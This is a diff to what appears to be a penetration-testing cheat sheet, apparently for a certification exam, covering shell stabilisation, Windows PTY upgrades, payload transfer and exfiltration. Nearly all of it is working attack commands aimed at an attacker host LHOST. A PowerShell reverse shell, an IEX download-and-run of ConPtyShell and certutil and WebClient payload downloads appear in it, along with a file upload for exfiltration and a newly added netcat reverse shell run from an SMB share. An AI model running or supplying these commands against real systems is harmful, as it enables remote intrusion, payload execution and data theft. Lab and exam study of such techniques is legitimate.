@@ -37,28 +37,29 @@ powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',443);$s=$c.GetSt
 
 ### Stabilize a Linux TTY (do this immediately)
 ```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'   # or python / script -qc /bin/bash /dev/null
+python3 -c 'import pty;pty.spawn("/bin/bash")'   # target — or: script -qc /bin/bash /dev/null
 # then:
 export TERM=xterm
-# background w/ Ctrl+Z, then on YOUR box:
+# Ctrl+Z backgrounds it
+# kali
 stty raw -echo; fg
 # (press Enter twice). Now you have arrows, tab, Ctrl+C.
 # size it right:
-stty size            # on your box -> get rows/cols
-stty rows 50 cols 200   # in the shell
+stty size            # note rows/cols
+stty rows 50 cols 200   # target
 ```
 
 ### Fully-interactive Windows shell (ConPtyShell — the Windows `stty` trick)
 Upgrade a dumb Windows shell to a real PTY (tab, history, working Ctrl-C):
 ```bash
-# On your box: raw the terminal so keystrokes pass through, note your size, then listen
+# kali — raw terminal, note size, then listen
 stty raw -echo; (stty size)          # -> e.g. 50 200
 nc -lvnp 443
 ```
 ```powershell
-# On target (from the initial dumb shell):
+# target — from the dumb shell
 IEX(IWR http://LHOST/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell LHOST 443 200 50
-# reset your terminal afterwards:  stty sane / reset
+# kali afterwards: stty sane   (or: reset)
 ```
 
 ### msfvenom payloads (NOT counted as Metasploit usage)
@@ -97,6 +98,7 @@ certutil -urlcache -split -f http://LHOST/file.exe file.exe
 powershell -c "iwr http://LHOST/file.exe -OutFile file.exe"
 powershell -c "(New-Object Net.WebClient).DownloadFile('http://LHOST/f.exe','f.exe')"
 copy \\LHOST\share\file.exe .        # from impacket-smbserver
+\\LHOST\share\nc.exe -e cmd.exe LHOST 443   # or run it straight off the share (no disk write)
 # exfil a file from Windows back to you:
 powershell -c "(New-Object Net.WebClient).UploadFile('http://LHOST/up','f')"   # need a receiver
 # or read it over SMB share you host (target writes to \\LHOST\share\)
